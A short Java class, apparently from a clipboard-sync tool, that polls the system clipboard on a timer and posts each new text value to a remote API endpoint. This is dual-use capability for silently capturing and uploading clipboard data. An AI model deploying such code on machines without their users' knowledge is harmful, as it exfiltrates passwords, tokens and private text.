package org.glowingstone;

import org.glowingstone.utils.Device;

import java.awt.*;
import java.awt.datatransfer.Clipboard;
import java.awt.datatransfer.DataFlavor;
import java.awt.datatransfer.Transferable;
import java.util.TimerTask;

public class ClipBoardListener extends TimerTask {
    private String previousClipboardContent = null;

    @Override
    public void run() {
        Clipboard clipboard = Toolkit.getDefaultToolkit().getSystemClipboard();
        Transferable contents = clipboard.getContents(null);

        if (contents != null && contents.isDataFlavorSupported(DataFlavor.stringFlavor)) {
            try {
                String clipboardText = (String) contents.getTransferData(DataFlavor.stringFlavor);

                if (clipboardText != null && !clipboardText.equals(previousClipboardContent)) {
                    previousClipboardContent = clipboardText;
                    ClipboardDataPoster.Post(clipboardText, Device.getPostApi());
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }
}
